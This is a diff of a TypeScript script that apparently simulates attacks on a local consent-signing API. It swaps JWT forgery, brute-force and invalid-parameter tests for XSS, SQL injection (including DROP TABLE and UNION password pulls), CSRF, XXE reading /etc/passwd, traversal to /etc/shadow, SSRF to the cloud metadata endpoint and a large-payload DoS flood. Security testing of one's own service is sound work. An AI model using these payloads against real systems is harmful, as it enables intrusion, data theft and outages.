@@ -1,5 +1,8 @@
 import { PrismaClient } from '@prisma/client';
+import { faker } from '@faker-js/faker';
 import jwt from 'jsonwebtoken';
+import axios from 'axios';
+
 const prisma = new PrismaClient();
 const JWT_SECRET = process.env.JWT_SECRET || 'your-secure-secret';
 
@@ -14,35 +17,24 @@ export const generateTIN = (prefix: string) => {
 	return prefix + timestamp;
 };
 
-/**
- * Simulate a JWT Token Manipulation Attack
- */
-const jwtTokenManipulationAttack = async (url: string) => {
+// ----------------------------
+// 1. Cross-Site Scripting (XSS)
+// ----------------------------
+const xssAttack = async (url: string) => {
 	try {
-		// Generate a fake JWT token
-		const fakePayload = {
-			iss: 'certification-authority',
-			aud: 'fake-client-id',
-			jti: 'fake-jti',
-			exp: 9999999999, // Far future expiry
-			scope: 'ca',
-		};
-
-		// Use a weak secret to sign the token
-		const fakeToken = jwt.sign(fakePayload, 'weak-secret');
-
-		// Use the fake token in a request
 		const headers = {
-			Authorization: `Bearer ${fakeToken}`,
-			'x-api-tran-id': generateTIN('IA102'),
+			Authorization: 'Bearer valid-token', // Replace with valid token
+			'x-api-tran-id': generateTIN('XSS'),
 		};
+
+		const maliciousScript = "<script>alert('XSS')</script>";
 
 		const body = {
 			sign_tx_id: 'ORG2025001_CA20250001_20250117120000_RITFHJGITORP',
 			user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
 			real_name: 'John Doe',
 			phone_num: '+821012345678',
-			request_title: 'Request for personal information',
+			request_title: maliciousScript, // Inject XSS payload
 			device_code: 'PC',
 			device_browser: 'WB',
 			return_app_scheme_url: 'mydata://auth',
@@ -51,7 +43,7 @@ const jwtTokenManipulationAttack = async (url: string) => {
 			consent_list: [
 				{
 					tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
-					consent_title: 'Consent to share personal information',
+					consent_title: maliciousScript, // Second injection point
 					consent: '958675948576879',
 					consent_len: 15,
 				},
@@ -60,43 +52,37 @@ const jwtTokenManipulationAttack = async (url: string) => {
 
 		const response = await fetch(url, {
 			method: 'POST',
-			headers: headers,
+			headers,
 			body: JSON.stringify(body),
 		});
 
-		console.log('JWT Token Manipulation Attack:');
+		console.log('XSS Attack:');
 		console.log(`Status Code: ${response.status}`);
 		console.log(`Response: ${await response.text()}\n`);
 	} catch (error) {
-		console.error('Error during JWT Token Manipulation Attack:', error);
+		console.error('XSS Attack Error:', error);
 	}
 };
 
-/**
- * Simulate a SQL Injection Attack
- */
+// ----------------------
+// 2. SQL Injection (SQLi)
+// ----------------------
 const sqlInjectionAttack = async (url: string) => {
 	try {
-		const payloads = [
-			"' OR '1'='1",
-			"' OR 'a'='a",
-			"' OR 1=1 --",
-			"' OR 'a'='a' --",
-			"' UNION SELECT null, null, null --",
-		];
+		const payloads = ["' OR '1'='1--", "'; DROP TABLE users--", "' UNION SELECT username, password FROM users--"];
 
 		for (const payload of payloads) {
 			const headers = {
-				Authorization: 'Bearer valid-token', // Replace with a valid token
-				'x-api-tran-id': generateTIN('IA102'),
+				Authorization: 'Bearer valid-token',
+				'x-api-tran-id': generateTIN('SQLi'),
 			};
 
 			const body = {
-				sign_tx_id: payload, // Inject payload into sign_tx_id
+				sign_tx_id: payload, // SQLi in transaction ID
 				user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
 				real_name: 'John Doe',
 				phone_num: '+821012345678',
-				request_title: 'Request for personal information',
+				request_title: 'Malicious Request',
 				device_code: 'PC',
 				device_browser: 'WB',
 				return_app_scheme_url: 'mydata://auth',
@@ -105,8 +91,8 @@ const sqlInjectionAttack = async (url: string) => {
 				consent_list: [
 					{
 						tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
-						consent_title: 'Consent to share personal information',
-						consent: '958675948576879',
+						consent_title: 'Consent',
+						consent: payload, // SQLi in consent field
 						consent_len: 15,
 					},
 				],
@@ -114,119 +100,31 @@ const sqlInjectionAttack = async (url: string) => {
 
 			const response = await fetch(url, {
 				method: 'POST',
-				headers: headers,
+				headers,
 				body: JSON.stringify(body),
 			});
 
-			console.log(`SQL Injection Payload: ${payload}`);
+			console.log(`SQLi Payload: ${payload}`);
 			console.log(`Status Code: ${response.status}`);
 			console.log(`Response: ${await response.text()}\n`);
 		}
 	} catch (error) {
-		console.error('Error during SQL Injection Attack:', error);
+		console.error('SQL Injection Error:', error);
 	}
 };
 
-/**
- * Simulate a Brute Force Attack
- */
-const bruteForceAttack = async (url: string) => {
+// ---------------------------------
+// 3. Cross-Site Request Forgery (CSRF)
+// ---------------------------------
+const csrfAttack = async (url: string) => {
 	try {
-		const clientId = 'valid-client-id'; // Replace with a valid client_id
-		const clientSecretList = ['secret1', 'secret2', 'secret3', 'password', '123456']; // Common passwords
-
-		for (const secret of clientSecretList) {
-			const headers = {
-				'Content-Type': 'application/x-www-form-urlencoded',
-				'x-api-tran-id': generateTIN('IA101'),
-			};
-
-			const body = new URLSearchParams({
-				grant_type: 'client_credential',
-				client_id: clientId,
-				client_secret: secret,
-				scope: 'ca',
-			});
-
-			const response = await fetch(url, {
-				method: 'POST',
-				headers: headers,
-				body: body,
-			});
-
-			console.log(`Brute Force Attempt: client_secret = ${secret}`);
-			console.log(`Status Code: ${response.status}`);
-			console.log(`Response: ${await response.text()}\n`);
-		}
-	} catch (error) {
-		console.error('Error during Brute Force Attack:', error);
-	}
-};
-
-/**
- * Simulate a Denial of Service (DoS) Attack
- */
-const dosAttack = async (url: string, numRequests: number = 100) => {
-	try {
-		for (let i = 0; i < numRequests; i++) {
-			const headers = {
-				Authorization: 'Bearer valid-token', // Replace with a valid token
-				'x-api-tran-id': generateTIN('IA102'),
-			};
-
-			const body = {
-				sign_tx_id: 'ORG2025001_CA20250001_20250117120000_RITFHJGITORP',
-				user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
-				real_name: 'John Doe',
-				phone_num: '+821012345678',
-				request_title: 'Request for personal information',
-				device_code: 'PC',
-				device_browser: 'WB',
-				return_app_scheme_url: 'mydata://auth',
-				consent_type: '0',
-				consent_cnt: 1,
-				consent_list: [
-					{
-						tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
-						consent_title: 'Consent to share personal information',
-						consent: '958675948576879',
-						consent_len: 15,
-					},
-				],
-			};
-
-			const response = await fetch(url, {
-				method: 'POST',
-				headers: headers,
-				body: JSON.stringify(body),
-			});
-
-			console.log(`DoS Request ${i + 1}:`);
-			console.log(`Status Code: ${response.status}`);
-			console.log(`Response: ${await response.text()}\n`);
-		}
-	} catch (error) {
-		console.error('Error during DoS Attack:', error);
-	}
-};
-
-/**
- * Simulate Invalid Parameter Injection
- */
-const invalidParameterAttack = async (url: string) => {
-	try {
-		const headers = {
-			Authorization: 'Bearer valid-token', // Replace with a valid token
-			'x-api-tran-id': generateTIN('IA102'),
-		};
-
-		// Test invalid sign_tx_id
-		const invalidSignTxIdBody = {
-			sign_tx_id: 'invalid_tx_id', // Invalid sign_tx_id
+		// Simulate CSRF by omitting auth headers
+		const body = {
+			sign_tx_id: 'ORG2025001_CA20250001_20250117120000_RITFHJGITORP',
 			user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
-			real_name: 'John Doe',
+			real_name: 'CSRF Victim',
 			phone_num: '+821012345678',
-			request_title: 'Request for personal information',
+			request_title: 'CSRF Attack',
 			device_code: 'PC',
 			device_browser: 'WB',
 			return_app_scheme_url: 'mydata://auth',
@@ -235,84 +133,225 @@ const invalidParameterAttack = async (url: string) => {
 			consent_list: [
 				{
 					tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
-					consent_title: 'Consent to share personal information',
+					consent_title: 'Consent',
 					consent: '958675948576879',
 					consent_len: 15,
 				},
 			],
 		};
 
-		const response1 = await fetch(url, {
+		const response = await fetch(url, {
 			method: 'POST',
-			headers: headers,
-			body: JSON.stringify(invalidSignTxIdBody),
+			body: JSON.stringify(body),
 		});
 
-		console.log('Invalid Parameter Attack (sign_tx_id):');
-		console.log(`Status Code: ${response1.status}`);
-		console.log(`Response: ${await response1.text()}\n`);
+		console.log('CSRF Attack:');
+		console.log(`Status Code: ${response.status}`);
+		console.log(`Response: ${await response.text()}\n`);
+	} catch (error) {
+		console.error('CSRF Attack Error:', error);
+	}
+};
 
-		// Test missing consent_list
-		const missingConsentListBody = {
+// --------------------------------
+// 4. XML External Entity (XXE) Injection
+// --------------------------------
+const xxeAttack = async (url: string) => {
+	try {
+		const xmlPayload = `<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root>
+  <sign_tx_id>&xxe;</sign_tx_id>
+</root>`;
+
+		const response = await fetch(url, {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/xml',
+				'x-api-tran-id': generateTIN('XXE'),
+			},
+			body: xmlPayload,
+		});
+
+		console.log('XXE Attack:');
+		console.log(`Status Code: ${response.status}`);
+		console.log(`Response: ${await response.text()}\n`);
+	} catch (error) {
+		console.error('XXE Attack Error:', error);
+	}
+};
+
+// ------------------------
+// 5. Directory Traversal
+// ------------------------
+const directoryTraversalAttack = async (url: string) => {
+	try {
+		const headers = {
+			Authorization: 'Bearer valid-token',
+			'x-api-tran-id': generateTIN('DIR'),
+		};
+
+		const body = {
 			sign_tx_id: 'ORG2025001_CA20250001_20250117120000_RITFHJGITORP',
-			user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
+			user_ci: '../../../../etc/passwd', // Directory traversal
 			real_name: 'John Doe',
 			phone_num: '+821012345678',
-			request_title: 'Request for personal information',
+			request_title: 'Sensitive File Access',
 			device_code: 'PC',
 			device_browser: 'WB',
 			return_app_scheme_url: 'mydata://auth',
 			consent_type: '0',
 			consent_cnt: 1,
-			// Missing consent_list
+			consent_list: [
+				{
+					tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
+					consent_title: 'Consent',
+					consent: '../../../../etc/shadow', // Second traversal attempt
+					consent_len: 15,
+				},
+			],
 		};
 
-		const response2 = await fetch(url, {
+		const response = await fetch(url, {
 			method: 'POST',
-			headers: headers,
-			body: JSON.stringify(missingConsentListBody),
+			headers,
+			body: JSON.stringify(body),
 		});
 
-		console.log('Invalid Parameter Attack (missing consent_list):');
-		console.log(`Status Code: ${response2.status}`);
-		console.log(`Response: ${await response2.text()}\n`);
+		console.log('Directory Traversal Attack:');
+		console.log(`Status Code: ${response.status}`);
+		console.log(`Response: ${await response.text()}\n`);
 	} catch (error) {
-		console.error('Error during Invalid Parameter Attack:', error);
+		console.error('Directory Traversal Error:', error);
 	}
 };
 
-/**
- * Main function to run all attack simulations
- */
-const runAttackSimulations = async () => {
-	const tokenUrl = 'http://localhost:3000/api/oauth/2.0/token';
-	const signRequestUrl = 'http://localhost:3000/api/ca/sign_request';
-	const signResultUrl = 'http://localhost:3000/api/ca/sign_result';
+// --------------------------------
+// 6. Server-Side Request Forgery (SSRF)
+// --------------------------------
+const ssrfAttack = async (url: string) => {
+	try {
+		const headers = {
+			Authorization: 'Bearer valid-token',
+			'x-api-tran-id': generateTIN('SSRF'),
+		};
 
-	console.log('Starting Attack Simulations...\n');
+		const body = {
+			sign_tx_id: 'ORG2025001_CA20250001_20250117120000_RITFHJGITORP',
+			user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
+			real_name: 'John Doe',
+			phone_num: '+821012345678',
+			request_title: 'SSRF Attack',
+			device_code: 'PC',
+			device_browser: 'WB',
+			return_app_scheme_url: 'http://169.254.169.254/latest/meta-data/', // AWS metadata endpoint
+			consent_type: '0',
+			consent_cnt: 1,
+			consent_list: [
+				{
+					tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
+					consent_title: 'Consent',
+					consent: 'http://internal-server:8080/admin',
+					consent_len: 15,
+				},
+			],
+		};
 
-	// JWT Token Manipulation Attack
-	await jwtTokenManipulationAttack(signRequestUrl);
+		const response = await fetch(url, {
+			method: 'POST',
+			headers,
+			body: JSON.stringify(body),
+		});
 
-	// SQL Injection Attack
-	await sqlInjectionAttack(signRequestUrl);
-
-	// Brute Force Attack
-	await bruteForceAttack(tokenUrl);
-
-	// Denial of Service (DoS) Attack
-	await dosAttack(signRequestUrl, 50); // 50 requests for simulation
-
-	// Invalid Parameter Attack
-	await invalidParameterAttack(signRequestUrl);
-
-	console.log('All Attack Simulations Completed.');
+		console.log('SSRF Attack:');
+		console.log(`Status Code: ${response.status}`);
+		console.log(`Response: ${await response.text()}\n`);
+	} catch (error) {
+		console.error('SSRF Attack Error:', error);
+	}
 };
 
-// Run the attack simulations
+// ------------------------
+// 7. Denial of Service (DoS)
+// ------------------------
+const dosAttack = async (url: string, requests: number = 1000) => {
+	try {
+		const headers = {
+			Authorization: 'Bearer valid-token',
+			'x-api-tran-id': generateTIN('DoS'),
+		};
+
+		const body = {
+			sign_tx_id: 'ORG2025001_CA20250001_20250117120000_RITFHJGITORP',
+			user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
+			real_name: 'DoS Attacker',
+			phone_num: '+821012345678',
+			request_title: 'A'.repeat(1000000), // Large payload
+			device_code: 'PC',
+			device_browser: 'WB',
+			return_app_scheme_url: 'mydata://auth',
+			consent_type: '0',
+			consent_cnt: 1,
+			consent_list: [
+				{
+					tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
+					consent_title: 'Consent',
+					consent: 'B'.repeat(1000000), // Large payload
+					consent_len: 15,
+				},
+			],
+		};
+
+		// Flood the API with requests
+		for (let i = 0; i < requests; i++) {
+			await fetch(url, {
+				method: 'POST',
+				headers,
+				body: JSON.stringify(body),
+			});
+			console.log(`DoS Request ${i + 1} Sent`);
+		}
+	} catch (error) {
+		console.error('DoS Attack Error:', error);
+	}
+};
+
+// ------------------------
+// Main Execution
+// ------------------------
+const runAttackSimulations = async () => {
+	const baseUrl = 'http://localhost:3000/api';
+
+	console.log('Starting All Attack Simulations...\n');
+
+	// 1. XSS Attack
+	await xssAttack(`${baseUrl}/ca/sign_request`);
+
+	// 2. SQL Injection
+	await sqlInjectionAttack(`${baseUrl}/ca/sign_request`);
+
+	// 3. CSRF Attack
+	await csrfAttack(`${baseUrl}/ca/sign_request`);
+
+	// 4. XXE Attack
+	await xxeAttack(`${baseUrl}/ca/sign_request`); // Assumes XML endpoint
+
+	// 5. Directory Traversal
+	await directoryTraversalAttack(`${baseUrl}/ca/sign_request`);
+
+	// 6. SSRF Attack
+	await ssrfAttack(`${baseUrl}/ca/sign_request`);
+
+	// 7. DoS Attack (Reduce requests for testing)
+	await dosAttack(`${baseUrl}/ca/sign_request`, 100);
+
+	console.log('All Attack Simulations Completed!');
+};
+
+// Run simulations
 runAttackSimulations()
 	.catch((e) => {
-		console.error('Error during attack simulations:', e);
+		console.error('Global Simulation Error:', e);
 		process.exit(1);
 	})
 	.finally(async () => {
